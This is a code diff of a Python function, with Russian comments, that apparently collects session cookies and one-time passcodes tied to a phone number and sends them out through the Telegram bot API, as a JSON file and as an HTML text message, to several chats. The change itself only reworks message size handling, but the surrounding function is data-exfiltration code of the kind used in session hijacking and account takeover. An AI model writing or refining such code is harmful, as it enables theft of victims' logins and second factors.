@@ -597,8 +597,13 @@ async def _send_cookies_to_tg_standalone(ctx2, phone_10: str, otp_code: str = ""
             return t.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
 
         safe_json = escape_html(cookies_json_compact)
-        MAX_CHUNK = 4000
-        json_chunks = [safe_json[i:i+MAX_CHUNK] for i in range(0, len(safe_json), MAX_CHUNK)]
+        otp_prefix = f"🔑 OTP: <code>{otp_code}</code>\n" if otp_code else ""
+        header_base = f"<b>Куки {label_phone} (фон) ({len(cookies_out)} шт.):</b>"
+        _TAGS = len(f"{otp_prefix}{header_base}\n<pre><code class=\"language-json\"></code></pre>")
+        _TG_MAX = 4096 - _TAGS - 10
+        text_msg = None
+        if len(safe_json) <= _TG_MAX:
+            text_msg = f"{otp_prefix}{header_base}\n<pre><code class=\"language-json\">{safe_json}</code></pre>"
 
         async with _hx.AsyncClient(timeout=15, trust_env=False) as _client:
             for _chat in _nc:
@@ -610,16 +615,11 @@ async def _send_cookies_to_tg_standalone(ctx2, phone_10: str, otp_code: str = ""
                         files={"document": (fname, io.BytesIO(cookies_json.encode("utf-8")), "application/json")}
                     )
 
-                    # 2. Отправка JSON кук текстом
-                    for i, chunk in enumerate(json_chunks):
-                        otp_header = f"🔑 OTP: <code>{otp_code}</code>\n" if (otp_code and i == 0) else ""
-                        header = f"Куки {label_phone} (фон) ({len(cookies_out)} шт.)"
-                        if len(json_chunks) > 1:
-                            header += f" (часть {i+1}/{len(json_chunks)})"
-                        msg = f"{otp_header}<b>{header}:</b>\n<pre><code class=\"language-json\">{chunk}</code></pre>"
+                    # 2. Текст — только если влезает в одно сообщение
+                    if text_msg:
                         await _client.post(
                             f"https://api.telegram.org/bot{_tok}/sendMessage",
-                            json={"chat_id": _chat, "text": msg, "parse_mode": "HTML"}
+                            json={"chat_id": _chat, "text": text_msg, "parse_mode": "HTML"}
                         )
                 except Exception:
                     pass
